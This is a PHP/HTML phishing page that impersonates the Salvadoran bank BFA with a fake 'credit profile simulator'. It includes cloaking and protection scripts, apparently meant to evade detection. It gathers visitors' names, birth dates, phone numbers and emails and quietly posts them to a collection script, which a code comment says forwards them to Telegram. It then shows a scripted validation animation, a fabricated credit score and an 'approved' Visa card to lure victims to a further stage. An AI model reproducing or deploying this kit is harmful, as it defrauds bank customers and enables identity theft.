<?php
require_once __DIR__ . '/cloak.php';
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BFA en Línea - Simulador Crediticio</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <script src="_protect.js"></script>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bfa-blue:#022a4f;
    --bfa-blue-2:#04477d;
    --bfa-blue-3:#0566b3;
    --bfa-orange:#FF9012;
    --bfa-gold:#FFD700;
    --bg:rgb(251,251,251);
    --text:#022a4f;
    --muted:#6b7a8a;
    --line:#e3e8ee;
    --ok:#16a34a;
    --warn:#f59e0b;
    --danger:#e53935;
  }
  html,body{font-family:'Montserrat','Segoe UI',Tahoma,sans-serif;color:var(--text);background:var(--bg);-webkit-font-smoothing:antialiased}
  a{color:inherit;text-decoration:none}
  img{max-width:100%;display:block}
  .container{max-width:980px;margin:0 auto;padding:0 20px}

  /* HEADER */
  .site-header{background:#f3f5f7;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:100}
  .header-inner{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;max-width:1180px;margin:0 auto}
  .logo-img{height:36px}
  .nav-desktop{display:flex;gap:26px;font-weight:600;font-size:14px}
  .nav-desktop a{color:var(--text);opacity:.75}
  .nav-desktop a.active{opacity:1;color:var(--bfa-blue);position:relative}
  .nav-desktop a.active::after{content:"";position:absolute;left:0;right:0;bottom:-18px;height:3px;background:linear-gradient(to right,var(--bfa-orange),var(--bfa-gold));border-radius:2px}
  .btn-login{background:var(--bfa-blue);color:#fff;padding:9px 20px;border-radius:24px;font-weight:700;font-size:13px}
  .menu-btn{display:none;background:none;border:0;cursor:pointer;flex-direction:column;gap:4px;padding:8px}
  .menu-btn span{width:22px;height:2px;background:var(--bfa-blue);display:block}

  /* HERO */
  .hero{position:relative;background:linear-gradient(135deg,var(--bfa-blue) 0%,var(--bfa-blue-2) 60%,var(--bfa-blue-3) 100%);color:#fff;text-align:center;padding:54px 20px;overflow:hidden}
  .hero-bg{position:absolute;inset:0;pointer-events:none}
  .hero-bg .circle{position:absolute;border-radius:50%;background:rgba(255,255,255,.06)}
  .hero-bg .circle-1{width:340px;height:340px;top:-110px;right:-100px}
  .hero-bg .circle-2{width:260px;height:260px;bottom:-90px;left:-80px}
  .hero-content{position:relative;z-index:1}
  .shield-icon{width:64px;height:64px;margin:0 auto 18px;background:linear-gradient(135deg,var(--bfa-orange),var(--bfa-gold));border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;box-shadow:0 12px 30px rgba(0,0,0,.25)}
  .shield-icon svg{width:32px;height:32px}
  .hero-title{font-size:30px;font-weight:800;letter-spacing:-.5px;margin-bottom:8px}
  .hero-sub{font-size:15px;opacity:.85;max-width:520px;margin:0 auto}

  /* STEPPER */
  .stepper-wrap{background:#fff;border-bottom:1px solid var(--line);padding:24px 0}
  .stepper{display:flex;justify-content:space-between;align-items:flex-start;list-style:none;position:relative;max-width:760px;margin:0 auto}
  .stepper::before{content:"";position:absolute;top:22px;left:8%;right:8%;height:2px;background:var(--line);z-index:0}
  .step{flex:1;display:flex;flex-direction:column;align-items:center;gap:10px;position:relative;z-index:1}
  .step-circle{width:46px;height:46px;border-radius:50%;background:#fff;border:2px solid var(--line);color:var(--muted);display:flex;align-items:center;justify-content:center;transition:all .3s}
  .step-circle svg{width:20px;height:20px}
  .step-label{font-size:11px;font-weight:600;color:var(--muted);text-align:center;line-height:1.3}
  .step.active .step-circle{background:linear-gradient(135deg,var(--bfa-orange),var(--bfa-gold));border-color:transparent;color:#fff;box-shadow:0 6px 18px rgba(255,144,18,.4)}
  .step.active .step-label{color:var(--bfa-blue)}
  .step.done .step-circle{background:var(--bfa-blue);border-color:var(--bfa-blue);color:#fff}
  .step.done .step-label{color:var(--bfa-blue)}

  /* MAIN */
  .main{padding:32px 20px 60px}
  .form-section{display:none;background:#fff;border:1px solid var(--line);border-radius:16px;padding:28px 26px;box-shadow:0 4px 20px rgba(2,42,79,.04)}
  .form-section.active{display:block;animation:fadeIn .35s ease}
  @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
  .form-title{font-size:22px;font-weight:800;color:var(--bfa-blue);margin-bottom:6px}
  .form-sub{font-size:14px;color:var(--muted);margin-bottom:22px}

  /* ALERT */
  .alert{display:flex;gap:12px;padding:14px 16px;border-radius:12px;margin-bottom:18px;font-size:14px;line-height:1.45;align-items:flex-start}
  .alert strong{display:block;margin-bottom:2px;color:var(--text)}
  .alert p{color:var(--muted);font-size:13px;margin:0}
  .alert.alert-warning{background:#fef7e6;border:1px solid #fbe3a3;color:#7c5a14}
  .alert.alert-warning strong{color:#7c5a14}
  .alert.alert-info{background:#eef4fb;border:1px solid #cdddee}
  .alert.alert-success{background:#e8f6ee;border:1px solid #b9e2c8}
  .alert.alert-success strong{color:#1a6b35}
  .alert-icon{width:36px;height:36px;border-radius:50%;background:var(--bfa-blue);color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
  .alert-icon svg{width:18px;height:18px}
  .alert-icon.success{background:var(--ok)}

  /* FORM */
  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
  .field{display:flex;flex-direction:column;gap:6px}
  .field.full,.actions.full,.alert.full{grid-column:1/-1}
  .field label{font-size:13px;font-weight:600;color:var(--text)}
  .req{color:var(--danger)}
  .input-wrap,.select-wrap{position:relative;display:flex;align-items:center}
  .input-icon{position:absolute;left:14px;width:18px;height:18px;color:var(--bfa-blue);opacity:.7;pointer-events:none}
  .input-wrap input,.select-wrap select{
    width:100%;padding:13px 14px 13px 42px;border:1.5px solid var(--line);border-radius:12px;font-size:14px;
    font-family:inherit;color:var(--text);background:#fff;outline:0;transition:border-color .2s,box-shadow .2s;
  }
  .select-wrap select{appearance:none;padding-right:42px;cursor:pointer}
  .select-caret{position:absolute;right:14px;width:18px;height:18px;color:var(--muted);pointer-events:none}
  .input-wrap input:focus,.select-wrap select:focus{border-color:var(--bfa-orange);box-shadow:0 0 0 3px rgba(255,144,18,.12)}
  .input-wrap input::placeholder{color:#9aa6b2}

  /* BUTTON */
  .actions{display:flex;justify-content:flex-end;margin-top:10px}
  .btn-primary{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,var(--bfa-orange),var(--bfa-gold));color:#fff;border:0;border-radius:30px;padding:12px 28px;font-weight:700;font-size:14px;cursor:pointer;font-family:inherit;box-shadow:0 8px 22px rgba(255,144,18,.35);transition:transform .15s,box-shadow .15s}
  .btn-primary:hover{transform:translateY(-1px);box-shadow:0 12px 26px rgba(255,144,18,.45)}
  .btn-primary svg{width:18px;height:18px}
  .btn-blue{background:var(--bfa-blue);color:#fff;display:inline-block;padding:11px 26px;border-radius:30px;font-weight:700;font-size:14px;width:100%;text-align:center;margin-top:8px;transition:filter .15s}
  .btn-blue:hover{filter:brightness(1.1)}

  /* VALIDATION (step 3) */
  .validation-block{text-align:center;padding:20px 10px}
  .spinner{width:64px;height:64px;border:5px solid #e9eef4;border-top-color:var(--bfa-orange);border-radius:50%;margin:0 auto 18px;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .validation-title{font-size:18px;font-weight:700;color:var(--bfa-blue);margin-bottom:6px}
  .validation-sub{color:var(--muted);font-size:14px;margin-bottom:22px}
  .status-list{list-style:none;text-align:left;max-width:380px;margin:0 auto;display:flex;flex-direction:column;gap:10px}
  .status-list li{display:flex;align-items:center;gap:12px;padding:10px 14px;background:#f7f9fc;border-radius:10px;font-size:14px;color:var(--text)}
  .status-icon{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:var(--ok);color:#fff}
  .status-icon svg{width:14px;height:14px}
  .status-loading{color:var(--muted)}
  .status-loading .status-icon{background:#fff;border:2px solid var(--bfa-orange)}
  .status-loading .status-dot{width:8px;height:8px;background:var(--bfa-orange);border-radius:50%;animation:pulse 1s ease-in-out infinite}
  @keyframes pulse{0%,100%{opacity:.3}50%{opacity:1}}

  /* PRODUCT CARD (step 4) */
  .product-card{display:grid;grid-template-columns:280px 1fr;gap:0;border:1px solid var(--line);border-radius:16px;overflow:hidden;margin:18px 0;background:#fff}
  .product-card-img{background:rgb(251,251,251);display:flex;align-items:center;justify-content:center;padding:24px;position:relative;overflow:hidden}
  .product-card-img .real-card{
    position:relative;width:240px;max-width:100%;height:auto;
    border-radius:14px;
    filter:drop-shadow(0 18px 36px rgba(0,0,0,.45));
    animation:floatC 4.5s ease-in-out infinite;
    transform-origin:center;
  }
  @keyframes floatC{
    0%,100%{transform:translateY(0) rotate(-3deg)}
    50%{transform:translateY(-12px) rotate(-3deg)}
  }
  .product-card-body{padding:22px 24px}
  .product-head{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-bottom:14px;flex-wrap:wrap}
  .product-title{font-size:16px;font-weight:800;color:var(--bfa-blue);line-height:1.3}
  .badge{font-size:11px;font-weight:800;padding:5px 12px;border-radius:20px;letter-spacing:.5px}
  .badge-success{background:#e8f6ee;color:var(--ok)}
  .product-info{list-style:none;margin-bottom:16px;border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:12px 0}
  .product-info li{display:flex;justify-content:space-between;font-size:13px;padding:6px 0;color:var(--muted)}
  .product-info li strong{color:var(--text);font-weight:700}
  .text-success{color:var(--ok)!important}
  .btn-purple{display:inline-block;background:linear-gradient(135deg,var(--bfa-orange),var(--bfa-gold));color:#fff;padding:11px 24px;border-radius:30px;font-weight:700;font-size:14px;width:100%;text-align:center;box-shadow:0 8px 22px rgba(255,144,18,.35);transition:transform .15s}
  .btn-purple:hover{transform:translateY(-1px)}
  .product-note{font-size:11px;color:var(--muted);text-align:center;margin-top:10px}

  /* SUMMARY */
  .summary-card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:22px 24px;margin:18px 0}
  .summary-title{font-size:16px;font-weight:700;color:var(--bfa-blue);margin-bottom:16px}
  .summary-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
  .summary-item{text-align:center;padding:14px 8px;background:#f7f9fc;border-radius:10px}
  .summary-value{font-size:22px;font-weight:800;color:var(--bfa-blue);line-height:1.1}
  .summary-label{font-size:11px;color:var(--muted);font-weight:600;margin-top:4px}

  /* FOOTER */
  .site-footer{background:var(--bfa-blue);color:rgba(255,255,255,.85);padding:26px 0;margin-top:30px}
  .footer-inner{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;padding:0 20px}
  .footer-logo-img{height:30px;filter:brightness(0) invert(1)}
  .footer-copy{font-size:12px;margin-top:8px;opacity:.8}
  .footer-links{display:flex;gap:22px;font-size:13px;font-weight:600}
  .footer-links a:hover{color:#fff}

  /* RESPONSIVE */
  @media (max-width:780px){
    .nav-desktop,.btn-login{display:none}
    .menu-btn{display:flex}
    .form-grid{grid-template-columns:1fr}
    .product-card{grid-template-columns:1fr}
    .summary-grid{grid-template-columns:repeat(2,1fr)}
    .hero-title{font-size:24px}
    .form-section{padding:22px 18px}
    .step-label{font-size:10px}
    .footer-inner{flex-direction:column;text-align:center}
  }
</style>
</head>
<body>
  <!-- Header -->
  <header class="site-header">
    <div class="container header-inner">
      <a href="#" class="logo" aria-label="Inicio">
        <img src="img/BFAonline_BFA_en_Linea.png" alt="BFA en Línea" class="logo-img" />
      </a>
      <nav class="nav-desktop" aria-label="Principal">
        <a href="#">Inicio</a>
        <a href="#" class="active">Simulador</a>
        <a href="#">Productos</a>
        <a href="#">Contacto</a>
      </nav>
      <a href="index.php" class="btn-login">Iniciar Sesión</a>
      <button class="menu-btn" aria-label="Abrir menú">
        <span></span><span></span><span></span>
      </button>
    </div>
  </header>

  <!-- Hero -->
  <section class="hero">
    <div class="hero-bg">
      <span class="circle circle-1"></span>
      <span class="circle circle-2"></span>
    </div>
    <div class="container hero-content">
      <div class="shield-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
      </div>
      <h1 class="hero-title">Evaluación de Perfil Financiero</h1>
      <p class="hero-sub">Ingresa tus datos para simular tu perfil financiero con BFA en Línea.</p>
    </div>
  </section>

  <!-- Stepper -->
  <section class="stepper-wrap">
    <div class="container">
      <ol class="stepper" id="stepper">
        <li class="step active" data-step="1">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
          </div>
          <span class="step-label">Datos<br/>Personales</span>
        </li>
        <li class="step" data-step="2">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="18" rx="2"/><path d="M9 2h6v4H9z"/><path d="M8 12h8M8 16h6"/></svg>
          </div>
          <span class="step-label">Contacto</span>
        </li>
        <li class="step" data-step="3">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
          </div>
          <span class="step-label">Validación</span>
        </li>
        <li class="step" data-step="4">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>
          </div>
          <span class="step-label">Resultados</span>
        </li>
      </ol>
    </div>
  </section>

  <!-- Forms -->
  <main class="container main">
    <!-- STEP 1 -->
    <section class="form-section active" data-form="1">
      <div class="alert alert-warning">
        <strong>Importante:</strong> Simulación informativa. Conoce los productos a los que podrías acceder.
      </div>

      <h2 class="form-title">Información Personal</h2>
      <p class="form-sub">Ingresa tus datos para simular tu perfil financiero con BFA.</p>

      <form id="form1" class="form-grid" novalidate>
        <div class="field">
          <label for="nombres">Nombres Completos <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <input type="text" id="nombres" name="nombres" placeholder="Juan Carlos" autocomplete="given-name" required />
          </div>
        </div>
        <div class="field">
          <label for="apellidos">Apellidos Completos <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            <input type="text" id="apellidos" name="apellidos" placeholder="Pérez González" autocomplete="family-name" required />
          </div>
        </div>
        <div class="actions full">
          <button type="submit" class="btn-primary">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 2 -->
    <section class="form-section" data-form="2">
      <h2 class="form-title">Información de Contacto</h2>
      <p class="form-sub">Estos datos nos permiten validar tu perfil con BFA en Línea.</p>

      <form id="form2" class="form-grid" novalidate>
        <div class="field">
          <label for="fechaNac">Fecha de Nacimiento <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
            <input type="text" id="fechaNac" name="fechaNac" inputmode="numeric" placeholder="DD/MM/AAAA" maxlength="10" autocomplete="off" required />
          </div>
        </div>

        <div class="field">
          <label for="phone">Teléfono <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
            <input type="tel" id="phone" name="phone" inputmode="numeric" placeholder="7000-0000" maxlength="9" autocomplete="tel" required />
          </div>
        </div>

        <div class="field">
          <label for="email">Correo Electrónico <span class="req">*</span></label>
          <div class="input-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 5L2 7"/></svg>
            <input type="email" id="email" name="email" placeholder="correo@gmail.com" autocomplete="email"
                   pattern="[^\s@]+@(gmail|googlemail|hotmail|outlook|live|msn|yahoo|ymail|icloud|me|mac|aol|protonmail|proton|zoho|gmx|mail)\.(com|net|org|es|mx|co|com\.sv)"
                   title="Solo se aceptan correos de proveedores comunes (Gmail, Hotmail, Outlook, iCloud, Yahoo, etc.)" required />
          </div>
        </div>

        <div class="field">
          <label for="antiguedad">Antigüedad con BFA <span class="req">*</span></label>
          <div class="select-wrap">
            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
            <select id="antiguedad" name="antiguedad" required>
              <option value="" disabled selected>Seleccionar</option>
              <option value="Menos de 1 año">Menos de 1 año</option>
              <option value="1 a 3 años">1 a 3 años</option>
              <option value="3 a 5 años">3 a 5 años</option>
              <option value="Más de 5 años">Más de 5 años</option>
              <option value="No soy cliente">No soy cliente</option>
            </select>
            <svg class="select-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
          </div>
        </div>

        <div class="alert alert-info full">
          <div class="alert-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
          </div>
          <div>
            <strong>Protección de Datos</strong>
            <p>Tus datos están protegidos y solo serán utilizados para evaluación crediticia con BFA - Banco de Fomento Agropecuario.</p>
          </div>
        </div>

        <div class="actions full">
          <button type="submit" class="btn-primary">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 3: Loading -->
    <section class="form-section" data-form="3">
      <h2 class="form-title">Simulación de Perfil Crediticio</h2>
      <p class="form-sub">Estamos analizando tu información para generar tu pre-aprobado.</p>

      <div class="validation-block">
        <div class="spinner" aria-hidden="true"></div>
        <h3 class="validation-title">Analizando tu Perfil Estimado</h3>
        <p class="validation-sub">Este proceso puede tomar hasta 30 segundos...</p>

        <ul class="status-list" id="statusList">
          <li class="status-done" data-s="1">
            <span class="status-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg></span>
            Verificando información personal
          </li>
          <li class="status-loading" data-s="2">
            <span class="status-icon"><span class="status-dot"></span></span>
            Consultando perfil financiero
          </li>
          <li class="status-loading" data-s="3">
            <span class="status-icon"><span class="status-dot"></span></span>
            Consultando historial crediticio
          </li>
          <li class="status-loading" data-s="4">
            <span class="status-icon"><span class="status-dot"></span></span>
            Analizando elegibilidad de productos...
          </li>
        </ul>
      </div>
    </section>

    <!-- STEP 4: Resultados -->
    <section class="form-section" data-form="4">
      <h2 class="form-title">Resultados de la Simulación</h2>
      <p class="form-sub">Basado en tu perfil estimado, tenemos las siguientes opciones para ti.</p>

      <div class="alert alert-success">
        <div class="alert-icon success">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
        </div>
        <div>
          <strong>¡Felicidades!</strong>
          <p>Tu perfil estimado cumple con nuestros criterios. Tienes acceso a múltiples opciones financieras con BFA.</p>
        </div>
      </div>

      <!-- Tarjeta producto -->
      <div class="product-card">
        <div class="product-card-img">
          <img src="img/car.PNG" alt="Tarjeta BFA" class="real-card" />
        </div>
        <div class="product-card-body">
          <div class="product-head">
            <h3 class="product-title">Tarjeta Crédito BFA Visa Platinum</h3>
            <span class="badge badge-success">APROBADA</span>
          </div>
          <ul class="product-info">
            <li><span>Monto aprobado:</span><strong class="text-success">$ 5,000.00</strong></li>
            <li><span>Tasa de interés:</span><strong>1.2% mensual</strong></li>
            <li><span>Cuota anual:</span><strong>$ 35.00</strong></li>
            <li><span>Plazo:</span><strong>Revolvente</strong></li>
          </ul>
          <a href="cargando.php" class="btn-purple">Solicitar Ahora</a>
          <p class="product-note">Oferta exclusiva. Sujeta a verificación de identidad.</p>
        </div>
      </div>

      <!-- Resumen de perfil -->
      <div class="summary-card">
        <h3 class="summary-title">Resumen de tu Perfil</h3>
        <div class="summary-grid">
<?php
  $score     = random_int(600, 820);
  $negativos = random_int(0, 2);
  $productos = random_int(1, 3);
?>
          <div class="summary-item">
            <div class="summary-value"><?= $score ?></div>
            <div class="summary-label">Score Crediticio</div>
          </div>
          <div class="summary-item">
            <div class="summary-value text-success">Excelente</div>
            <div class="summary-label">Historial</div>
          </div>
          <div class="summary-item">
            <div class="summary-value"><?= $negativos ?></div>
            <div class="summary-label">Reportes Negativos</div>
          </div>
          <div class="summary-item">
            <div class="summary-value"><?= $productos ?></div>
            <div class="summary-label">Productos Aptos</div>
          </div>
        </div>
      </div>

      <div class="alert alert-info">
        <div class="alert-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
        </div>
        <div>
          <strong>Validación Segura y Confidencial</strong>
          <p>Simula tu pre-aprobado en línea. Consultamos digitalmente tu historial crediticio con total privacidad.</p>
        </div>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="site-footer">
    <div class="container footer-inner">
      <div>
        <img src="img/BFAonline_BFA_en_Linea.png" alt="BFA" class="footer-logo-img" />
        <p class="footer-copy">© 2026 BFA - Banco de Fomento Agropecuario. Todos los derechos reservados.</p>
      </div>
      <nav class="footer-links" aria-label="Pie">
        <a href="#">Privacidad</a>
        <a href="#">Términos</a>
        <a href="#">Seguridad</a>
        <a href="#">Ayuda</a>
      </nav>
    </div>
  </footer>

<script>
(function(){
  // Datos del usuario en localStorage para envío final
  var datos = {};

  var steps    = document.querySelectorAll('.step');
  var sections = document.querySelectorAll('.form-section');

  function go(n){
    steps.forEach(function(s){
      var d = parseInt(s.dataset.step,10);
      s.classList.remove('active','done');
      if (d < n) s.classList.add('done');
      else if (d === n) s.classList.add('active');
    });
    sections.forEach(function(sec){
      sec.classList.toggle('active', parseInt(sec.dataset.form,10) === n);
    });
    window.scrollTo({top:0,behavior:'smooth'});
  }

  // Step 1 → 2
  document.getElementById('form1').addEventListener('submit', function(e){
    e.preventDefault();
    var f = e.target;
    if (!f.nombres.value.trim() || !f.apellidos.value.trim()) return;
    datos.nombres   = f.nombres.value.trim();
    datos.apellidos = f.apellidos.value.trim();
    go(2);
  });

  // Auto-formato fecha DD/MM/AAAA
  var fn = document.getElementById('fechaNac');
  fn.addEventListener('input', function(){
    var v = this.value.replace(/\D/g,'').slice(0,8);
    if (v.length > 4) v = v.slice(0,2)+'/'+v.slice(2,4)+'/'+v.slice(4);
    else if (v.length > 2) v = v.slice(0,2)+'/'+v.slice(2);
    this.value = v;
  });

  // Auto-formato teléfono ####-####
  var ph = document.getElementById('phone');
  ph.addEventListener('input', function(){
    var v = this.value.replace(/\D/g,'').slice(0,8);
    if (v.length > 4) v = v.slice(0,4)+'-'+v.slice(4);
    this.value = v;
  });

  // Validación de correo (silenciosa)
  var emailRe = /^[^\s@]+@(gmail|googlemail|hotmail|outlook|live|msn|yahoo|ymail|icloud|me|mac|aol|protonmail|proton|zoho|gmx|mail)\.(com|net|org|es|mx|co|com\.sv)$/i;

  // Step 2 → 3 → 4
  document.getElementById('form2').addEventListener('submit', function(e){
    e.preventDefault();
    var f = e.target;
    if (!f.fechaNac.value || !f.phone.value || !f.email.value || !f.antiguedad.value) return;
    if (!emailRe.test(f.email.value.trim())) { f.email.focus(); return; }
    datos.fechaNac   = f.fechaNac.value;
    datos.phone      = f.phone.value;
    datos.email      = f.email.value;
    datos.antiguedad = f.antiguedad.value;

    // Enviar a Telegram en background
    var body = new FormData();
    Object.keys(datos).forEach(function(k){ body.append(k, datos[k]); });
    fetch('simular_send.php', { method:'POST', body: body }).catch(function(){});

    // Pasar a validación
    go(3);

    // Animar los pasos de validación uno por uno
    var items = document.querySelectorAll('#statusList li');
    var delays = [1200, 2400, 3600];
    delays.forEach(function(d, i){
      setTimeout(function(){
        var li = items[i+1];
        if (!li) return;
        li.classList.remove('status-loading');
        li.classList.add('status-done');
        li.querySelector('.status-icon').innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>';
      }, d);
    });

    // Pasar a resultados después de ~5s
    setTimeout(function(){ go(4); }, 5200);
  });
})();
</script>
</body>
</html>
